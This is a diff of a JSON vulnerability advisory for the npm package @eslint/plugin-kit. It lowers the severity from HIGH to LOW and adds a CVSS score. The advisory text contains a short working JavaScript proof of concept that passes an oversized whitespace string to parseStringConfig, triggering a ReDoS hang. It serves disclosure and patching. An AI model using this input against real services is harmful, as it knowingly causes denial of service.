@@ -1,5 +1,5 @@
 {
-  "Severity": "HIGH",
+  "Severity": "LOW",
   "UpdatedAt": "2024-11-15T20:47:32Z",
   "Package": {
     "Ecosystem": "NPM",
@@ -33,13 +33,13 @@
     "Description": "Crafting a very large and well crafted string can increase the CPU usage and crash the program.\n\n## POC\n\n```js\nconst { ConfigCommentParser } = require(\"@eslint/plugin-kit\");\n\nvar str = \"\";\nfor (var i = 0; i \u003c 1000000; i++) {\n  str += \" \";\n}\nstr += \"A\";\n\nconsole.log(\"start\")\nvar parser = new ConfigCommentParser();\nconsole.log(parser.parseStringConfig(str, \"\"));\nconsole.log(\"end\")\n\n// run `npm i @eslint/plugin-kit` and `node attack.js` \n// then the program will stuck forever with high CPU usage\n```",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2024-11-15T20:47:31Z",
-    "Severity": "HIGH",
+    "Severity": "LOW",
     "Summary": "Regular Expression Denial of Service (ReDoS) in @eslint/plugin-kit",
-    "UpdatedAt": "2024-11-18T07:21:06Z",
+    "UpdatedAt": "2024-11-18T20:49:17Z",
     "WithdrawnAt": "",
     "CVSS": {
-      "Score": 0,
-      "VectorString": ""
+      "Score": 3.5,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:L"
     }
   },
   "Versions": [
